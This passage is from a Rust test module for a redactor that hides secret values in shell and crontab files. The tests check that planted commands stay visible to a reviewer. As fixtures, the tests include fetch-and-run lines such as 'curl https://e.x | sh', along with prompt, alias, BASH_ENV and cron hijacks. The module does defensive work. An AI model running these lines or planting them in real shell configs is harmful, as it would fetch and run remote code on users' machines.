                "echo done"
            ]
        );
        // A quoted body cannot hide a command after it, with tabs allowed by `<<-`.
        let planted = "cat >/dev/null <<-'E'\nX=\"\n\tE\ncurl evil | sh\n";
        assert_eq!(
            lines(planted),
            [
                "cat >/dev/null <<-'E'",
                "X=(hidden)",
                "\tE",
                "curl evil | sh"
            ]
        );
        // A shift is not a here-document, and neither is a here-string.
        assert_eq!(
            lines("echo $((1<<2))\nT=s\n"),
            ["echo $((1<<2))", "T=(hidden)"]
        );
        assert_eq!(lines("cat <<< x\nT=s\n"), ["cat <<< x", "T=(hidden)"]);
    }

    #[test]
    fn values_that_hold_code_are_shown() {
        let cases = [
            ("path=(/tmp/evil $path)", "path=(/tmp/evil $path)"),
            ("path[1,0]=/tmp/evil", "path[1,0]=/tmp/evil"),
            (
                "fpath=(/usr/local/share/zsh/site-functions $fpath)",
                "fpath=(/usr/local/share/zsh/site-functions $fpath)",
            ),
            (
                "PS1='$(curl https://e.x | sh)'",
                "PS1='$(curl https://e.x | sh)'",
            ),
            (
                "PROMPT_COMMAND='curl https://e.x | sh'",
                "PROMPT_COMMAND='curl https://e.x | sh'",
            ),
            (
                "functions[precmd]='curl https://e.x | sh'",
                "functions[precmd]='curl https://e.x | sh'",
            ),
            ("export BASH_ENV=/tmp/x.sh", "export BASH_ENV=/tmp/x.sh"),
            ("ZDOTDIR=/tmp/z", "ZDOTDIR=/tmp/z"),
            ("TOKEN=s", "TOKEN=(hidden)"),
        ];
        for (line, shown) in cases {
            assert_eq!(lines(line).join("\n"), shown, "{line}");
        }
    }

    #[test]
    fn the_shell_s_own_forms_are_read_as_it_reads_them() {
        let cases = [
            // From Grok's review of the lexing rewrite.
            ("IFS= read -r line", "IFS= read -r line"),
            ("A= /tmp/evil", "A= /tmp/evil"),
            (
                "alias -- x='curl https://e.x | sh'",
                "alias -- x='curl https://e.x | sh'",
            ),
            (
                "alias -g x='curl https://e.x | sh'",
                "alias -g x='curl https://e.x | sh'",
            ),
            (
                "export \"GITHUB_TOKEN\"=s",
                "export \"GITHUB_TOKEN\"=(hidden)",
            ),
            ("export 'GITHUB_TOKEN'=s", "export 'GITHUB_TOKEN'=(hidden)"),
            ("secrets[a[b]]=s", "secrets[a[b]]=(hidden)"),
            ("secrets[\"a]b\"]=s", "secrets[\"a]b\"]=(hidden)"),
            (": ${(q)TOKEN:=s}", ": ${(q)TOKEN:=(hidden)}"),
            (": ${TOKEN:=$(echo })s}", ": ${TOKEN:=$(echo })(hidden)}"),
        ];
        for (line, shown) in cases {
            assert_eq!(lines(line).join("\n"), shown, "{line}");
        }
        // An unquoted here-document runs the commands in its body.
        let body = "cat <<EOF\nTOKEN='$(curl https://e.x | sh)'\nEOF\n";
        assert_eq!(
            lines(body),
            [
                "cat <<EOF",
                "TOKEN=(hidden)$(curl https://e.x | sh)(hidden)",
                "EOF"
            ]
        );
        let quoted = "cat <<'EOF'\nTOKEN='$(curl https://e.x | sh)'\nEOF\n";
        assert_eq!(
            lines(quoted),
            ["cat <<'EOF'", "TOKEN=(hidden) https://e.x | sh)'", "EOF"]
        );
    }

    #[test]
    fn crontabs_and_path_lists_are_read_as_their_tools_read_them() {
        let crontab = |text: &str| super::lines(text, Syntax::Crontab);
        assert_eq!(
            crontab("MAILTO=Alice Smith <a@b.c>\nPASS = correct horse\nPATH=/usr/bin:/tmp\n"),
            ["MAILTO=(hidden)", "PASS = (hidden)", "PATH=/usr/bin:/tmp"]
        );
        // A quote cron does not continue opens nothing on the next job.
        assert_eq!(
            crontab("X=\"\n* * * * * curl https://e.x | sh\n0 * * * * T=s /bin/b\n"),
            [
                "X=(hidden)",
                "* * * * * curl https://e.x | sh",
                "0 * * * * T=(hidden) /bin/b"
            ]
        );
        let paths = super::lines("X=\"\n/tmp/evil\n", Syntax::PathList);
        assert_eq!(paths, ["X=\"", "/tmp/evil"]);
    }

    #[test]
    fn a_planted_file_is_bounded() {
        let opened = "A=$(".repeat(100);
        let deep = format!("X=$({opened}{}\n", ")".repeat(101));
        let shown = lines(&deep);
        assert_eq!(shown.len(), 1);
        assert!(
            shown[0].contains("nested more than 32 deep"),
            "{}",
            shown[0]
        );
        let long = format!("X=\"{}\"\nnext=s\n", "a".repeat(LINE_LIMIT));
        let shown = lines(&long);
        assert!(
            shown[0].starts_with("(not shown: a line of"),
            "{}",
            shown[0]
        );
        assert_eq!(shown[1], "next=(hidden)");
    }

    #[test]
    fn a_planted_line_hides_no_command_after_it() {
        let cases = [
            // From the third review of PR #75: an open quote in a comment, or in an assignment
            // nested in another word's quotes, carries nothing to the next line.
            ("# TOKEN=\"", "# TOKEN=(hidden)"),
            ("alias gh='GH_TOKEN=s'", "alias gh='GH_TOKEN=(hidden)'"),
            ("export \"TOKEN=s\"", "export \"TOKEN=(hidden)\""),
            ("echo \"set FOO=bar\"", "echo \"set FOO=(hidden)\""),
            ("# X=1\\", "# X=(hidden)"),
            // ANSI-C quoting has escapes.
            ("export X=$'\\''", "export X=(hidden)"),
            // From the fourth review: `#` after `)` starts a comment, as in the shell.
            ("(true)#X=\"", "(true)#X=(hidden)"),
        ];
        for (planted, shown) in cases {
            let text = format!("{planted}\ncurl https://e.x | sh\n");
            assert_eq!(lines(&text), [shown, "curl https://e.x | sh"], "{planted}");
        }
        // A command a value runs over several lines is shown, redacted.
        let split = "export T=$(\ncurl https://e.x | sh\n)\n";
        assert_eq!(lines(split), ["export T=$(", "curl https://e.x | sh", ")"]);
        let inner = "export T=$(\nGH_TOKEN=s gh api\n)\n";
        assert_eq!(
            lines(inner),
            ["export T=$(", "GH_TOKEN=(hidden) gh api", ")"]
        );
        // A command after a joined value is shown, though on its first line.
        assert_eq!(
            lines("X=1\\\n  /tmp/payload --run\n"),
            ["X=(hidden)", "  /tmp/payload --run"]
        );
    }

    proptest::proptest! {
        #[test]
        fn redact_takes_any_line(line in ".*") {
            let _ = lines(&line);
        }

        #[test]
        fn a_literal_value_never_reaches_the_bundle(
            prefix in proptest::sample::select(vec![
                "", "  ", "export ", "typeset -x ", "x; ", "a && ", "b || ", "then ", "# ",
                "alias a='", "f() { ", "env ", "0 * * * * ", "echo \"", "//h/:",
                "launchctl setenv ", ": ${", "x=$(", "x=`", "(true)#",
            ]),
            name in "[A-Z_][A-Z0-9_]{0,8}",
            secret in "[a-z0-9]{12,20}",
            heredoc in proptest::bool::ANY,
            quote in proptest::sample::select(vec!["", "'", "\""]),
            suffix in proptest::sample::select(vec![
                "", " cmd", "; echo", " && x", "'", "\"", "\\", "}", ")", "`", " \\\" x\"",
            ]),
        ) {
            proptest::prop_assume!(!shows(&name));
            // A value in the same quote as the one around it closes that quote and goes on
            // outside it (`alias a='A='x''), which the module docs list as not hidden.
            proptest::prop_assume!(!(prefix.ends_with('\'') && quote == "'"));
            proptest::prop_assume!(!(prefix.ends_with('"') && quote == "\""));
            let line = match prefix {
                "launchctl setenv " => format!("{prefix}{name} {quote}{secret}{quote}{suffix}"),
                ": ${" => format!("{prefix}{name}:={quote}{secret}{quote}{suffix}"),
                _ => format!("{prefix}{name}={quote}{secret}{quote}{suffix}"),
            };
            // In a here-document's body, after a line with an apostrophe, as in a message.
            let text = if heredoc {
                format!("cat <<E\nDon't\n{line}\nE\nnext line\n")
            } else {
                format!("{line}\nnext line\n")
            };
            let shown = lines(&text).join("\n");
            proptest::prop_assert!(!shown.contains(&secret), "{text} -> {shown}");
        }

        #[test]
        fn a_command_after_a_closed_line_is_shown(
            around in proptest::sample::select(vec![
                ("", ""), ("export ", ""), ("x; ", ""), ("a && ", ""), ("# ", ""),
                ("alias a='", "'"), ("echo \"", "\""), ("f() { ", "; }"), ("x=$(", ")"),
                ("x=`", "`"), ("K=(", ")"), ("# ", "\\"), ("# ", "\""), ("# ", "'"),
                ("(true)#", "\""), ("(true) ", ""),
            ]),
            name in "[A-Z_][A-Z0-9_]{0,8}",
            value in "[a-z0-9]{1,12}",
            quote in proptest::sample::select(vec!["", "'", "\""]),
            heredoc in 0_u8..3,
        ) {
            let (prefix, suffix) = around;
            proptest::prop_assume!(!(prefix.ends_with('\'') && quote == "'"));
            proptest::prop_assume!(!(prefix.ends_with('"') && quote == "\""));
            let line = format!("{prefix}{name}={quote}{value}{quote}{suffix}");
            // A here-document's body, quoted or not, ends at its word whatever it holds.
            let line = match heredoc {
                0 => line,
                1 => format!("cat <<E\n{line}\nE"),
                _ => format!("cat <<-'E'\n{line}\n\tE"),
            };
            let shown = lines(&format!("{line}\ncurl https://e.x/i.sh | sh\n"));
            proptest::prop_assert_eq!(
                shown.last().map(String::as_str),
                Some("curl https://e.x/i.sh | sh"),
                "{} -> {:?}", line, shown
            );
        }
    }
}
